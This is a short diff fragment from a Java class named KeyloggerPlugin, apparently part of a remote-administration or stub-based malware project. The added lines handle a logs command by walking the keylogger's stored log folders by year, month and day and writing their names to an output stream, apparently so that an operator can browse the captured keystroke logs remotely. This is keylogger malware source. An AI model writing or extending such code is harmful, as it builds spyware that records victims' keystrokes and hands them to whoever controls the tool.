@@ -53,7 +53,29 @@ public class KeyloggerPlugin extends StubPlugin {
 				}
 			}
 		} else if (header == LOGS_HEADER) {
-			Keylogger.
+			File[] years = Keylogger.getYearFolder().listFiles();
+			
+			dos.writeInt(years.length);
+			
+			for (File year : years) {
+				dos.writeUTF(year.getName());
+				
+				File[] months = year.listFiles();
+				
+				dos.writeInt(months.length);
+				
+				for (File month : months) {
+					dos.writeUTF(month.getName());
+					
+					File[] days = month.listFiles();
+					
+					dos.writeInt(days.length);
+					
+					for (File day : days) {
+						dos.writeUTF(day.getName());
+					}
+				}
+			}
 		}
 	}
 
